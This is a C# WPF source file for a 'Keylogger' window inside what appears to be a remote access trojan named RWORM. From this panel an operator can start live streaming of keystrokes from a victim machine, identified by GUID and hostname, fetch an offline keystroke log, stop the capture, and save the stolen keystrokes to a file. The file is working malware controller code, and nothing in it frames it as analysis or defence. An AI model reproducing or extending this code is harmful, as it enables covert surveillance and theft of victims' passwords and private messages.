using System;
using System.Windows;
using System.Windows.Media;
using Microsoft.Win32;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class KeyloggerWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _onlineActive;

        public KeyloggerWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            TitleLabel.Text = $"Keylogger — {hostname}";

            _server.RegisterKeylogHandler(guid, OnKeylogData);
        }

        private void OnKeylogData(string data)
            => Dispatcher.Invoke(() =>
            {
                LogBox.AppendText(data);
                LogBox.ScrollToEnd();
            });

        private void Online_Click(object s, RoutedEventArgs e)
        {
            _ = _server.StartKeylogger(_guid, online: true);
            _onlineActive = true;
            StatusDot.Fill = new SolidColorBrush(Color.FromRgb(0x3F, 0xB9, 0x50));
            StatusLabel.Text = "Online — streaming keystrokes";
        }

        private void Offline_Click(object s, RoutedEventArgs e)
        {
            LogBox.Clear();
            _ = _server.DumpOfflineLog(_guid);
            StatusLabel.Text = "Fetching offline log...";
        }

        private void Stop_Click(object s, RoutedEventArgs e)
        {
            _ = _server.StopKeylogger(_guid);
            _onlineActive = false;
            StatusDot.Fill = new SolidColorBrush(Color.FromRgb(0x8B, 0x94, 0x9E));
            StatusLabel.Text = "Stopped";
        }

        private void Save_Click(object s, RoutedEventArgs e)
        {
            var dlg = new SaveFileDialog
            {
                Filter   = "Text|*.txt|All|*.*",
                FileName = $"keylog_{_guid[..8]}_{DateTime.Now:yyyyMMdd_HHmmss}.txt"
            };
            if (dlg.ShowDialog() == true)
            {
                System.IO.File.WriteAllText(dlg.FileName, LogBox.Text);
                StatusLabel.Text = $"Saved → {dlg.FileName}";
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterKeylogHandler(_guid);
            if (_onlineActive) _ = _server.StopKeylogger(_guid);
            base.OnClosed(e);
        }
    }
}
